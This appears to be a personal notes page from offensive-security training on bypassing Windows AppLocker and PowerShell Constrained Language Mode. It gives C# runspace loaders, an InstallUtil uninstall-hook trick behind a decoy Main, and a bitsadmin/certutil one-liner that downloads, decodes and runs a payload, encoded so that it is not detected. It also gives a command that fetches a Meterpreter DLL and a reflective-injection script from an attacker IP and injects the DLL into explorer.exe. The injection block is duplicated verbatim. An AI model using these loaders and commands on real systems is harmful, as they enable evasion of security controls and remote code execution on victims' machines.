---
layout:     post
author:     0x5c4r3
type: docs
permalink: Applocker_Bypass_Powershell
---


<span style="font-size: 35px; color:red"><b>Applocker Bypass with Powershell</b></span>
&nbsp;
To compile in x64:
```cs
using System;
using System.Management.Automation;
using System.Management.Automation.Runspaces;

namespace Bypass
{
    class Program
    {
        static void Main(string[] args)
        {
            Runspace rs = RunspaceFactory.CreateRunspace();
            rs.Open();


			PowerShell ps = PowerShell.Create();
			ps.Runspace = rs;
		
			String cmd = "<CAMBIA QUI CON COMANDO POWERSHELL>";
			ps.AddScript(cmd);
			ps.Invoke();
			rs.Close();
		  }
    }
}
```
To import System.Management.Automation.Runspaces, right click on Reference (right side) and Add Reference, we'll then select the _Browse..._ button at the bottom of the window and navigate to the `C:\Windows\assembly\GAC_MSIL\System.Management.Automation\1.0.0.0__31bf3856ad364e35` folder where we will select System.Management.Automation.dll.

This exploit will create a custom powershell runspace to run code in that won't be affected by Applocker.

---

<span style="font-size: 25px; color:white"><b>Powershell CLM Bypass</b></span>
Using InstallUtil (utility that allows the installation and uninstallation of server resources)

To compile:
```cs
using System;
using System.Management.Automation;
using System.Management.Automation.Runspaces;
using System.Configuration.Install;

namespace Bypass
{
    class Program
    {
        static void Main(string[] args)
        {
            Console.WriteLine("This is the main method which is a decoy"); 'change here
        }
    }

    [System.ComponentModel.RunInstaller(true)]
    public class Sample : System.Configuration.Install.Installer
    {
        public override void Uninstall(System.Collections.IDictionary savedState)
        {
            String cmd = "$ExecutionContext.SessionState.LanguageMode | Out-File -FilePath C:\\Tools\\test.txt";
            Runspace rs = RunspaceFactory.CreateRunspace();
            rs.Open();

            PowerShell ps = PowerShell.Create();
            ps.Runspace = rs;

            ps.AddScript(cmd);

            ps.Invoke();

            rs.Close();
        }
    }
}
```


<span style="font-size: 25px; color:white"><b>OneLiner</b></span>
```shell
bitsadmin /Transfer myJob http://<your_ip>/file.txt C:\users\student\enc.txt && certutil -decode C:\users\student\enc.txt C:\users\student\Bypass.exe && del C:\users\student\enc.txt && C:\Windows\Microsoft.NET\Framework64\v4.0.30319\installutil.exe /logfile= /LogToConsole=false /U C:\users\student\Bypass.exe
```

<span style="font-size: 25px; color:white"><b>Step-By-Step</b></span>

To make sure it's note detected, you can base64 encode it like so (will dump encrypted file in file.txt):
```shell
certutil -encode C:\Users\Offsec\source\repos\Bypass\Bypass\bin\x64\Release\Bypass.exe file.txt
```

To download it:
```shell
bitsadmin /Transfer myJob http://192.168.119.120/file.txt C:\Users\student\enc.txt
```

To decode it:
```shell
certutil -decode enc.txt Bypass.exe
```

To run it (if it's saved as Bypass.exe),
```shell
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\installutil.exe /logfile= /LogToConsole=false /U C:\Tools\Bypass.exe
```

<span style="font-size: 25px; color:white"><b>Reflective Injection</b></span>
```
String cmd = "$bytes = (New-Object System.Net.WebClient).DownloadData('http://192.168.119.120/met.dll');(New-Object System.Net.WebClient).DownloadString('http://192.168.119.120/Invoke-ReflectivePEInjection.ps1') | IEX; $procid = (Get-Process -Name explorer).Id; Invoke-ReflectivePEInjection -PEBytes $bytes -ProcId $procid";
```
Change the above script payload line with ^ this one to download the Meterpreter DLL (created from msfvenom) into a byte array, determine the process ID of explorer.exe for the DLL injection and download and execute the <span style="color:red">Invoke-ReflectivePEInjection</span> script.
```
String cmd = "$bytes = (New-Object System.Net.WebClient).DownloadData('http://192.168.119.120/met.dll');(New-Object System.Net.WebClient).DownloadString('http://192.168.119.120/Invoke-ReflectivePEInjection.ps1') | IEX; $procid = (Get-Process -Name explorer).Id; Invoke-ReflectivePEInjection -PEBytes $bytes -ProcId $procid";
```
Change the above script payload line with ^ this one to download the Meterpreter DLL (created from msfvenom) into a byte array, determine the process ID of explorer.exe for the DLL injection and download and execute the <span style="color:red">Invoke-ReflectivePEInjection</span> script.
